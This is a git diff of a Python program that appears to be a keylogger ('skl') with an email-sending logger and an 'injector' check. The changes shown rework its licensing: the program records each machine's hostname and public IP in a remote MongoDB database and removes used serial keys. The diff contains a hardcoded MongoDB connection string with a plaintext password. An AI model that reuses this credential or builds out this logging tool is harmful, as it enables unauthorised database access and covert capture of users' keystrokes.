@@ -195,16 +195,22 @@ def CapsStatus():
      
 #!# -----------------------------------LOGGER----------------------------------- #!#
 
+
+def get_ip_address(mode):
+    url = 'https://api.ipify.org'
+    response = requests.get(url)
+    ip_address = response.text
+    hostname = socket.gethostname()
+    if mode == None:
+        return hostname, ip_address
+    elif mode == "ip":
+        return ip_address
+        
+
+
 def START_LOGGER(senderEmail,senderPassword,receiverEmail, mode):                     
   
  
-    def get_ip_address():
-        url = 'https://api.ipify.org'
-        response = requests.get(url)
-        ip_address = response.text
-        hostname = socket.gethostname()
-        return hostname, ip_address
-
 
 
     mode = parsed['mode']
@@ -453,10 +459,11 @@ if isInjector() == 1 or isInjector() == 5:
                 
 #&# ----------------------------------- DATA-BASE ----------------------------------- #&#
 
-def connectToDatabase():
+def connectToDatabase(returnItem):
     
 
     try:
+        
         uri = "mongodb+srv://skl:4rcQtgbSZbyq5AIC@skl.jdigidi.mongodb.net/?retryWrites=true&w=majority"
 
         client = MongoClient(uri, server_api=ServerApi('1'))
@@ -468,8 +475,12 @@ def connectToDatabase():
         cursor = collection.find_one("skl-program-serial-keys")
         serial_keys = cursor["skl-serial-key"]
   
-        
-        return serial_keys
+        if returnItem == "collection":
+            return collection
+        elif returnItem == "serial-keys":
+            return serial_keys
+        elif returnItem == "database":
+            return database
        
         
         
@@ -478,7 +489,35 @@ def connectToDatabase():
 
 
 
+def returnCollection(serial):
+    coll = connectToDatabase("collection")
+    serial_keys_name = "skl-serial-key"
+    coll.update_one(
+         {"_id": "skl-program-serial-keys"},
+         {"$pull": {serial_keys_name: serial}}
+     )
+    database = connectToDatabase("database")
+    coll2 = database["allowed-hosts"]
+    USER_NAME = socket.gethostname()
+    IP = get_ip_address("ip")
+    coll2.insert_one(
+        {"_id": USER_NAME,
+        "ip_addr": IP})
     
+
+def returnUserHostName():
+    database = connectToDatabase("database")
+    coll = database["allowed-hosts"]
+    USER_NAME = socket.gethostname()
+    IP = get_ip_address("ip")
+    try:
+        host = coll.find_one({"_id": USER_NAME, "ip_addr": IP})
+        if host != None:
+            return True
+        else:
+            return False
+    except:
+        return False
     
     
     
@@ -487,16 +526,13 @@ def connectToDatabase():
     
 
 def license():
-    serial_keys = connectToDatabase()
+    serial_keys = connectToDatabase("serial-keys")
     
     try:
-        with open(f"{path}/serial.json", "r") as file:
-            parsed = json.load(file)
-            serial = parsed["serial"]
-            if serial in serial_keys:
-                return True
-            else:
-                raise Exception
+        if returnUserHostName():
+           return True
+        else:
+            raise Exception
     except:
         pass
             
@@ -511,6 +547,7 @@ def license():
         with open(f"{path}/serial.json","w") as file:
             serial_key_json = {"serial": serial}
             json.dump(serial_key_json, file)
+            returnCollection(serial)
             return True
       
     else:
@@ -572,4 +609,5 @@ isLicensed()
 
 
 print(bcolors.WHITE)
+       
        
